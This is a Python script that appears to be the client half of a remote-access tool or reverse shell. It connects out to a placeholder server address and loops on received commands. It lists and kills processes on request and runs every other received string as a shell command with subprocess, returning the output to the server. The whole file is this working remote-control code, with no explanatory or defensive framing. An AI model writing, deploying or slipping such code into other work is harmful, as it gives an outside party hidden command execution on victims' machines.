import socket
import subprocess
import sys
import os
import psutil
import win32gui
import win32process

SERVER_HOST = "ADDRESS"
SERVER_PORT = PORT
BUFFER_SIZE = 4096

# create the socket object
s = socket.socket()
try:

    # connect to the server
    s.connect((SERVER_HOST, SERVER_PORT))
    print("connecting...")
except:
    print("Failed to connect to proxy")
# receive the greeting message
message = s.recv(BUFFER_SIZE).decode()
print("Server:", message)


while True:
    # receive the command from the server
    command = s.recv(BUFFER_SIZE).decode()
    # Check command with
    if command.lower() == "exit": # exit command
        # if the command is exit, just break out of the loop
        print("Lost Connection to Server: Disconnected by User")
        break
    if command.lower() == "ps": # list proccesses
        ProcessList = ""
        for proc in psutil.process_iter():
            try:
                processName = proc.name()
                processID = proc.pid
                process = processName + ":::" + str(processID) + "\n"
                ProcessList = ProcessList + process
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass
        s.send(ProcessList.encode())
    if command.lower().startswith("kill"): # kill process
        try:
            p = psutil.Process(int(command[5:]))
            p.kill()
            s.send(("Process Killed").encode()) # let server know process has been killed
        except psutil.AccessDenied: # Access Denied exception
            s.send(("Could not Kill Process, Access Denied").encode())
        except psutil.NoSuchProcess: # No Such Process exception
            s.send(("Process does not exsist").encode())
    # execute the command that doesn't exsist above
    output = subprocess.getoutput(command)
    # send the results back to the server
    s.send(output.encode())
# close client connection before closing
s.close()